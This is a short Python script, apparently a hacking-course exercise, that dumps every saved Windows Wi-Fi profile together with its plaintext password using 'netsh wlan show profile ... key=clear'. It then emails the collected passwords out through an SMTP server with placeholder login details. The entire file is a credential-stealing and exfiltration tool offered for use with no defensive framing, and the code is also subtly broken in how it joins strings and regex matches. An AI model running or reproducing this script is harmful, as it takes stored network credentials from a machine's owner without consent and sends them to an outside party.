#!/usr/bin/env/python

import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.google.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = 'netsh wlan show profile'
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall('(Profile\s*:\s)(.*)', networks)

output = ''
for network_name in network_names_list:
    command = 'netsh wlan show profile ' + network_name + ' key=clear'
    result = subprocess.check_output(command, shell=True)
    output = output + result

send_mail('#', '#', output)
